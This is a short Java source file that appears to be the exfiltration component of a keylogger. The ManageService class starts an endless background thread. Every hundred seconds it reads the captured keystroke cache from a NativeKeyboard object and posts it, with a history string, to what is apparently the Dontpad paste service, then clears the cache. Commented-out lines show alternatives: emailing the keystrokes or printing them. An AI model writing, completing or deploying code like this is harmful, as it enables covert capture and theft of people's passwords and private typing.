package handlers;

import keys.NativeKeyboard;

public class ManageService implements Runnable{
	private NativeKeyboard keyboard;
	private Thread service;
	private String history;
	
	public ManageService(String text) {
		history = text;
		keyboard = new NativeKeyboard();
		service = new Thread(this, "Manage Service");
		service.start();
	}
	
	public NativeKeyboard getKeyboard() {
		return keyboard;
	}

	@Override
	public void run() {
		while(true) {
			
			try {
				Thread.sleep(100000);
				//	Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
				//  System.out.println( Utils.prettyPrint(keyboard.getKeyCache()));
				DontpadRequest.sendPost(history + Utils.prettyPrint(keyboard.getKeyCache()));
				keyboard.onSend();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
